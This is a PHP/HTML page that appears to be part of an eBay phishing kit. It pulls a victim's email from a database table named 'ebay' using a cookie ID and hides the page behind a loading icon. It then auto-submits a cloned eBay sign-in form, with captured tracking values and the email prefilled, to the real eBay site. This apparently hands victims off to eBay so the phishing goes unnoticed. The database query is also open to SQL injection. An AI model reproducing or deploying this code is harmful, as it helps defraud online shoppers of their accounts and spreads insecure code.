<style>body{margin-left:-200%;}</style><img src="../small_icons/328.gif" style="left:45%; top:40%;position:absolute"/><!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Untitled Document</title>
</head>
<?
require_once('../db.php');
$uid=htmlspecialchars($_COOKIE['uid']);
$query = mysql_query("SELECT user_email FROM `ebay` WHERE `user_id`='$uid'"); 
$result = mysql_fetch_assoc($query); 
$email=$result['user_email'];  
?>
<body onLoad="javascript: submitform()">

<script type="text/javascript">function submitform()  {document.forms["SignInForm"].submit();}</script>



<form name="SignInForm" id="SignInForm" method="post" action="https://signin.ebay.com/ws/eBayISAPI.dll?co_partnerId=2&amp;siteid=0&amp;UsingSSL=1"><input type="hidden" name="MfcISAPICommand" id="MfcISAPICommand" value="SignInWelcome"><input type="hidden" name="bhid" id="bhid" value="a1%3Dna~a2%3Dna~a3%3Dna~a4%3DMozilla~a5%3DNetscape~a6%3D5.0%20(Windows%20NT%206.2%3B%20WOW64)%20AppleWebKit%2F537.17%20(KHTML%2C%20like%20Gecko)%20Chrome%2F24.0.1312.57%20Safari%2F537.17~a7%3D20030107~a8%3Dna~a9%3Dtrue~a10%3D~a11%3Dtrue~a12%3DWin32~a13%3Dna~a14%3DMozilla%2F5.0%20(Windows%20NT%206.2%3B%20WOW64)%20AppleWebKit%2F537.17%20(KHTML%2C%20like%20Gecko)%20Chrome%2F24.0.1312.57%20Safari%2F537.17~a15%3Dtrue~a16%3Den-US~a17%3DISO-8859-1~a18%3Dsignin.ebay.com~a19%3Dna~a20%3Dna~a21%3Dna~a22%3Dna~a23%3D1366~a24%3D768~a25%3D32~a26%3D728~a27%3Dna~a28%3DThu%20Feb%2007%202013%2012%3A43%3A27%20GMT%2B0200%20(T%C3%BCrkiye%20Standart%20Saati)~a29%3D2~a30%3D~a31%3Dyes~a32%3Dna~a33%3Dna~a34%3Dno~a35%3Dno~a36%3Dyes~a37%3Dyes~a38%3Donline~a39%3Dno~a40%3DWin32~a41%3Dyes~a42%3Dno~"><input type="hidden" name="UsingSSL" value="1"><input type="hidden" name="inputversion" id="inputversion" value="2"><input type="hidden" name="lse" id="lse" value="false"><input type="hidden" name="lsv" id="lsv" value=""><input type="hidden" name="mid" id="mid" value="AQAAATyigInaAAUxM2NiNDQwZGJhMS5hNWU4NDcxLjNhNTkzLmZmYjc0YWQw/kUTrUlj9rNiJ07eQsuLBz1E21c*"><input type="hidden" name="kgver" id="kgver" value="1"><input type="hidden" name="kgupg" id="kgupg" value="1"><input type="hidden" name="kgstate" id="kgstate" value=""><input type="hidden" name="omid" id="omid" value=""><input type="hidden" name="hmid" id="hmid" value=""><input type="hidden" name="rhr" id="rhr" value="f"><input type="hidden" name="siteid" value="0"><input type="hidden" name="co_partnerId" value="2"><input type="hidden" name="ru" id="ru" value="http://www.ebay.com/"><input type="hidden" name="pp" id="pp" value=""><input type="hidden" name="pa1" value=""><input type="hidden" name="pa2" value=""><input type="hidden" name="pa3" value=""><input type="hidden" name="i1" value="-1"><input type="hidden" name="pageType" value="-1"><input type="hidden" name="rtmData" value="A01=AAAAAANPmAAAAAAAw;M01=AI;TC01=QAsW1ARLPBAAAAAAQzjJAAAAAAAMI;PS=T.0"><input type="hidden" name="bUrlPrfx" id="bUrlPrfx" value="40dba113cb41oz6f"><input type="hidden" name="rqid" id="rqid" value="b440dba113c0a5e847104ab0ff1e30b6"><input type="hidden" name="kgct" id="kgct" value=""><div><div class="disTxt"></div><div class="sd-uid"><div class="sd-ezp"><span><span class="sd-eym"></span></span></div><div></div><div class="sd-sd"><span class="sd-unl"><label for="userid">User ID&nbsp;&nbsp;</label></span><span><input size="40" maxlength="64" class="txtBxF" value="<?=$email;?>" name="userid" id="userid"></span></div><div><span class="sd-unl"><label for="pass">Password&nbsp;&nbsp;</label></span><span><input size="40" maxlength="64" class="txtBxF" value="" name="pass" id="pass" type="password"></span><div><span class="sd-sv">Forgot your <a href="https://scgi.ebay.com/ws/eBayISAPI.dll?UserIdRecognizerShow">user ID</a> or <a href="https://scgi.ebay.com/ws/eBayISAPI.dll?FYPShow">password</a>?</span></div></div></div></div><div class="sd-ezp"><div class="sd-km"><b class="sd-pcs"><input type="checkbox" name="keepMeSignInOption" value="1" id="signed_in" checked="checked"></b><span class="sd-pcsm"><label for="signed_in">Stay signed in</label></span><span class="sd-sgn">(Uncheck if you're on a shared computer)</span></div></div><div class="sd-sb"><input type="submit" name="sgnBt" title="Sign in" value="Sign in" id="sgnBt" class="btn btn-prim sd-sgnBtn"></div><input type="hidden" id="htmid" name="htmid" value="sl%3D%7Cslnew%3D%7Cht5%3DAQAAATyigInaAAUxM2NiNDQwZGJhMS5hNWU4NDcxLjNhNTkzLmZmYjc0YWQw%252FkUTrUlj9rNiJ07eQsuLBz1E21c*%7Cht5new%3Dtrue"></form>

</body>
</html>

